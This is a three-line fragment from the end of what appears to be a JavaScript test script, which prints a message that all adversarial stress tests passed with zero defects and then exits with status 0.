  console.log("\nALL ADVERSARIAL STRESS TESTS COMPLETED SUCCESSFULLY WITH ZERO DEFECTS.");
  process.exit(0);
}
